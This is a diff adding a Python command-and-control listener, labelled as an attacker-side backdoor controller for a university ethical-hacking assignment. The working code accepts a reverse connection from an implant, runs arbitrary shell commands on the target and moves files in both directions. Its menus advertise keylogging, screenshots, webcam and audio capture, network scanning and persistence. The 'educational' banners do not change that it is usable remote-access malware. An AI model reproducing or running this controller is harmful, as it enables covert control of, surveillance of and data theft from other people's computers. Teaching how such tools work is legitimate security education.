@@ -1,0 +1,272 @@
+################################################
+# Enhanced Backdoor Controller (Attacker Side) #
+# Author: Enhanced for DES484 Assignment       #
+# Class: SIIT Ethical Hacking                  #
+# WARNING: For Educational Purposes Only!      #
+#                                              #
+# USAGE: Run this on the ATTACKER machine      #
+# This will listen for incoming connections    #
+################################################
+
+import socket
+import json
+import os
+import sys
+import time
+
+
+class BackdoorController:
+    """Enhanced backdoor controller for the attacker machine"""
+    
+    def __init__(self, host='0.0.0.0', port=5555):
+        self.host = host
+        self.port = port
+        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.target_socket = None
+        self.target_address = None
+    
+    def reliable_send(self, data):
+        """Send data reliably (encoded as JSON)"""
+        try:
+            jsondata = json.dumps(data)
+            self.target_socket.send(jsondata.encode())
+        except Exception as e:
+            print(f"[!] Error sending data: {e}")
+    
+    def reliable_recv(self):
+        """Receive data reliably (expects JSON data)"""
+        data = ''
+        while True:
+            try:
+                data = data + self.target_socket.recv(1024).decode().rstrip()
+                return json.loads(data)
+            except ValueError:
+                continue
+            except Exception as e:
+                print(f"[!] Error receiving data: {e}")
+                return None
+    
+    def upload_file(self, file_name):
+        """Upload a file to the target"""
+        try:
+            with open(file_name, 'rb') as f:
+                self.target_socket.send(f.read())
+            print(f"[+] File uploaded: {file_name}")
+        except FileNotFoundError:
+            print(f"[!] File not found: {file_name}")
+        except Exception as e:
+            print(f"[!] Error uploading file: {e}")
+    
+    def download_file(self, file_name):
+        """Download a file from the target"""
+        try:
+            with open(file_name, 'wb') as f:
+                self.target_socket.settimeout(1)
+                chunk = self.target_socket.recv(1024)
+                while chunk:
+                    f.write(chunk)
+                    try:
+                        chunk = self.target_socket.recv(1024)
+                    except socket.timeout:
+                        break
+                self.target_socket.settimeout(None)
+            print(f"[+] File downloaded: {file_name}")
+        except Exception as e:
+            print(f"[!] Error downloading file: {e}")
+    
+    def start_listener(self):
+        """Start listening for incoming connections"""
+        try:
+            self.server_socket.bind((self.host, self.port))
+            self.server_socket.listen(5)
+            print(f"[+] Listening on {self.host}:{self.port}")
+            print("[*] Waiting for incoming connections...")
+            
+            self.target_socket, self.target_address = self.server_socket.accept()
+            print(f"[+] Connection established from {self.target_address[0]}:{self.target_address[1]}")
+            
+            # Send initial system info request
+            self.reliable_send('sysinfo')
+            result = self.reliable_recv()
+            if result:
+                print(result)
+            
+            return True
+        except Exception as e:
+            print(f"[!] Error starting listener: {e}")
+            return False
+    
+    def print_banner(self):
+        """Print banner and help information"""
+        banner = """
+        ╔═══════════════════════════════════════════════════════════════╗
+        ║           Enhanced Backdoor Controller v2.0                   ║
+        ║              For Educational Purposes Only!                   ║
+        ║                  DES484 - SIIT 2024                          ║
+        ╚═══════════════════════════════════════════════════════════════╝
+
+        Type 'help' or 'help_advanced' for available commands.
+        Type 'quick' for quick reference of advanced features.
+        """
+        print(banner)
+    
+    def print_help(self):
+        """Print basic help information"""
+        help_text = """
+        ╔═══════════════════════════════════════════════════════════════╗
+        ║                     BASIC COMMANDS                            ║
+        ╚═══════════════════════════════════════════════════════════════╝
+
+        help                - Show this help message
+        help_advanced       - Show advanced backdoor features
+        quick               - Quick reference for advanced features
+        clear               - Clear screen
+        sysinfo             - Get system information
+        cd <directory>      - Change directory on target
+        download <file>     - Download file from target
+        upload <file>       - Upload file to target
+        quit                - Close connection and exit
+
+        Any other command will be executed as a shell command on the target.
+
+        ╔═══════════════════════════════════════════════════════════════╗
+        ║                   ADVANCED FEATURES                           ║
+        ╚═══════════════════════════════════════════════════════════════╝
+
+        For detailed information on advanced features (keylogger, privilege
+        escalation, screen capture, network discovery, persistence), type:
+        
+        help_advanced
+        """
+        print(help_text)
+    
+    def print_quick_reference(self):
+        """Print quick reference for advanced features"""
+        quick_ref = """
+        ╔═══════════════════════════════════════════════════════════════╗
+        ║                   QUICK REFERENCE                             ║
+        ╚═══════════════════════════════════════════════════════════════╝
+
+        KEYLOGGER:          keylog_start, keylog_stop, keylog_dump
+        PRIVILEGES:         priv_check, priv_enum, priv_services
+        SCREEN:             screenshot, screenshot_multi 5 2, screenshot_list
+        AUDIO:              audio_record 10, audio_list
+        WEBCAM:             webcam_snap
+        NETWORK:            net_info, net_scan, net_connections
+        PERSISTENCE:        persist_install, persist_check, persist_remove
+
+        Type 'help_advanced' for detailed descriptions.
+        """
+        print(quick_ref)
+    
+    def command_loop(self):
+        """Main command loop"""
+        while True:
+            try:
+                # Get command from attacker
+                command = input(f"\n[{self.target_address[0]}]> ").strip()
+                
+                if not command:
+                    continue
+                
+                # Handle local commands
+                if command == 'help':
+                    self.print_help()
+                    continue
+                
+                elif command == 'quick':
+                    self.print_quick_reference()
+                    continue
+                
+                elif command == 'clear':
+                    os.system('clear' if os.name != 'nt' else 'cls')
+                    continue
+                
+                elif command == 'quit':
+                    self.reliable_send('quit')
+                    print("[*] Connection closed.")
+                    break
+                
+                elif command[:8] == 'download':
+                    self.reliable_send(command)
+                    # Receive the file
+                    file_name = command[9:]
+                    self.download_file(file_name)
+                    continue
+                
+                elif command[:6] == 'upload':
+                    file_name = command[7:]
+                    self.reliable_send(command)
+                    time.sleep(0.5)  # Small delay for synchronization
+                    self.upload_file(file_name)
+                    continue
+                
+                # Send command to target and receive result
+                self.reliable_send(command)
+                
+                # Receive and display result (unless it's upload/download)
+                result = self.reliable_recv()
+                if result:
+                    print("\n" + str(result))
+            
+            except KeyboardInterrupt:
+                print("\n[!] Ctrl+C detected. Type 'quit' to exit properly.")
+            except Exception as e:
+                print(f"[!] Error in command loop: {e}")
+                break
+    
+    def run(self):
+        """Main execution flow"""
+        self.print_banner()
+        
+        if self.start_listener():
+            try:
+                self.command_loop()
+            except Exception as e:
+                print(f"[!] Error: {e}")
+            finally:
+                self.cleanup()
+        else:
+            print("[!] Failed to start listener.")
+            self.cleanup()
+    
+    def cleanup(self):
+        """Clean up resources"""
+        try:
+            if self.target_socket:
+                self.target_socket.close()
+            if self.server_socket:
+                self.server_socket.close()
+            print("[*] Resources cleaned up.")
+        except:
+            pass
+
+
+def main():
+    """Main entry point"""
+    print("=" * 70)
+    print("  Enhanced Backdoor Server - ATTACKER SIDE")
+    print("  This program LISTENS for incoming connections")
+    print("  WARNING: For Educational Purposes Only!")
+    print("=" * 70)
+    
+    # Configuration
+    HOST = '0.0.0.0'  # Listen on all interfaces (0.0.0.0)
+    PORT = 5556     # Port to listen on (must match ATTACKER_PORT in backdoor.py)
+    
+    # Allow command-line arguments for port
+    if len(sys.argv) > 1:
+        PORT = int(sys.argv[1])
+    
+    print(f"\n[*] Server will listen on: {HOST}:{PORT}")
+    print("[*] Waiting for target to connect back...")
+    print("=" * 70 + "\n")
+    
+    # Create and run controller
+    controller = BackdoorController(HOST, PORT)
+    controller.run()
+
+
+if __name__ == "__main__":
+    main()
